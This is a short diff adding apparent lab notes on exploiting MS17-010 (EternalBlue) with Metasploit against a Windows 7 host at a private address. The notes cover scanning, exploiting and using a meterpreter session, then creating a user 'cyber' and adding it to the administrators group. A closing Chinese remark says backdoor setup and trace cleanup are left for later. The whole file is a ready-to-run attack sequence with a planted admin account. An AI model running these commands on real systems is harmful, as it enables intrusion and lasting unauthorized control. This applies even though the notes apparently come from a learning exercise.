@@ -1,0 +1,28 @@
+msfconsole
+search ms17_010
+use auxiliary/scanner/smb/smb_ms17_010
+show options
+set THREADS 40
+set RHOST 192.168.241.136
+run
+
+
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.241.136
+exploit
+
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > screenshot
+meterpreter > shell
+
+whoami
+net user
+net user cyber cyber /add
+net localgroup administrators cyber /add
+
+
+win7打开计算机管理
+可以发现，cyber已经是管理员用户组的一员了
+接下来则是后门和痕迹清理（暂时鸽了）
